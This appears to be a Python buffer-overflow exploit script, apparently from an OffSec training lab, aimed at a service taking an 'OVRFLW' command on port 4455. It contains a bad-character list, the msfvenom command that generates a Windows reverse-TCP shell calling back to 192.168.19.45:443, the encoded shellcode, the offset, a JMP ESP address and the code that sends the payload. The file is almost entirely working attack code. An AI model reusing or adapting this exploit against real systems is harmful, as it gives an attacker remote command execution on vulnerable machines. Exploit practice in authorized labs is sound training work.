#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = (
"\x01\x02\x03\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x5a\x5b\x5c\x5d\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

##Bad characters: \x00\x04\x3c\x59\x5e\x97

##msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.45 LPORT=443 -f python -e x86/fnstenv_mov -b"\x00\x04\x3c\x59\x5e\x97"

buf =  b""
buf += b"\x33\xc9\xb1\x51\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
buf += b"\x13\xc2\xdd\x26\x07\x83\xeb\xfc\xe2\xf4\x3e\x35\xa4"
buf += b"\x07\xc2\xdd\x46\x8e\x27\xec\xe6\x63\x49\x8d\x16\x8c"
buf += b"\x90\xd1\xad\x55\xd6\x56\x54\x2f\xcd\x6a\x6c\x21\xf3"
buf += b"\x22\x8a\x3b\xa3\xa1\x24\x2b\xe2\x1c\xe9\x0a\xc3\x1a"
buf += b"\xc4\xf5\x90\x8a\xad\x55\xd2\x56\x6c\x3b\x49\x91\x37"
buf += b"\x7f\x21\x95\x27\xd6\x93\x56\x7f\x27\xc3\x0e\xad\x4e"
buf += b"\xda\x3e\x1c\x4e\x49\xe9\xad\x06\x14\xec\xd9\xab\x03"
buf += b"\x12\x2b\x06\x05\xe5\xc6\x72\x34\xde\x5b\xff\xf9\xa0"
buf += b"\x02\x72\x26\x85\xad\x5f\xe6\xdc\xf5\x61\x49\xd1\x6d"
buf += b"\x8c\x9a\xc1\x27\xd4\x49\xd9\xad\x06\x12\x54\x62\x23"
buf += b"\xe6\x86\x7d\x66\x9b\x87\x77\xf8\x22\x82\x79\x5d\x49"
buf += b"\xcf\xcd\x8a\x9f\xb5\x15\x35\xc2\xdd\x4e\x70\xb1\xef"
buf += b"\x79\x53\xaa\x91\x51\x21\xc5\x22\xf3\xbf\x52\xdc\x26"
buf += b"\x07\xeb\x19\x72\x57\xaa\xf4\xa6\x6c\xc2\x22\xf3\x57"
buf += b"\x92\x8d\x76\x47\x92\x9d\x76\x6f\x28\xd2\xf9\xe7\x3d"
buf += b"\x08\xb1\x6d\xc7\xb5\xe6\xaf\xd1\xf0\x4e\x05\xc2\xdc"
buf += b"\x9d\x8e\x24\xb7\x36\x51\x95\xb5\xbf\xa2\xb6\xbc\xd9"
buf += b"\xd2\x47\x1d\x52\x0b\x3d\x93\x2e\x72\x2e\xb5\xd6\xb2"
buf += b"\x60\x8b\xd9\xd2\xaa\xbe\x4b\x63\xc2\x54\xc5\x50\x95"
buf += b"\x8a\x17\xf1\xa8\xcf\x7f\x51\x20\x20\x40\xc0\x86\xf9"
buf += b"\x1a\x06\xc3\x50\x62\x23\xd2\x1b\x26\x43\x96\x8d\x70"
buf += b"\x51\x94\x9b\x70\x49\x94\x8b\x75\x51\xaa\xa4\xea\x38"
buf += b"\x44\x22\xf3\x8e\x22\x93\x70\x41\x3d\xed\x4e\x0f\x45"
buf += b"\xc0\x46\xf8\x17\x66\xd6\xb2\x60\x8b\x4e\xa1\x57\x60"
buf += b"\xbb\xf8\x17\xe1\x20\x7b\xc8\x5d\xdd\xe7\xb7\xd8\x9d"
buf += b"\x40\xd1\xaf\x49\x6d\xc2\x8e\xd9\xd2"

##Offset is 1441

##Buffer size test
#payload = 'A'*1441+'BBBB'+'C'*(3500-1441-4)

##Bad character test
#payload = 'A'*1441+'BBBB'+badchars

##Address=56526683 Message=  0x56526683 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [dont_sue_me_offsec.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False
##Pointer for JMP ESP in dont_sue_me_offsec: 56526683

#Attack
payload = 'A'*1441+'\x83\x66\x52\x56'+'x\90'*8+buf


try:
	print "Testing"
	s.connect(('192.168.45.110',4455))
	data = s.recv(1024)
	print data

	s.send('OVRFLW '+payload+'\r\n')
	s.close()
	print "The deed is done."

except:
	print "No dice!"
